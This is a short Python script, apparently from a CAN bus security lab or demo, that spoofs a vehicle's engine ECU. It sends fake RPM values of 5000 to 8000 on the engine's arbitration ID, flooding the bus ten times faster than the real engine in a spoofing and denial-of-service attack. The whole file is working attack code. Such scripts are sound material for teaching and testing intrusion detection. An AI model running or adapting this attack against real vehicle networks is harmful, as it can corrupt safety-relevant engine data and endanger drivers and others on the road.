import can
import time
import random
import config

def hacker_attack():
    bus = can.Bus(**config.BUS_CONFIG)
    print(" HACKER NODE CONNECTED... Waiting to inject faults.")
    time.sleep(2)
    
    try:
        while True:
            # The attack: Send random RPMs extremely fast (DoS / Spoofing)
            fake_rpm = random.randint(5000, 8000) # Scary high RPM
            rpm_bytes = fake_rpm.to_bytes(2, byteorder='big')
            
            msg = can.Message(arbitration_id=config.CAN_ID_ENGINE, # Impersonating Engine
                              data=[rpm_bytes[0], rpm_bytes[1], 0, 0, 0, 0, 0, 0],
                              is_extended_id=False)
            
            bus.send(msg)
            print(f" INJECTED FAKE RPM: {fake_rpm}")
            
            # Send much faster than the real engine (0.01s vs 0.1s)
            time.sleep(0.01) 

    except KeyboardInterrupt:
        print("Hacker Disconnected.")

if __name__ == "__main__":
    hacker_attack()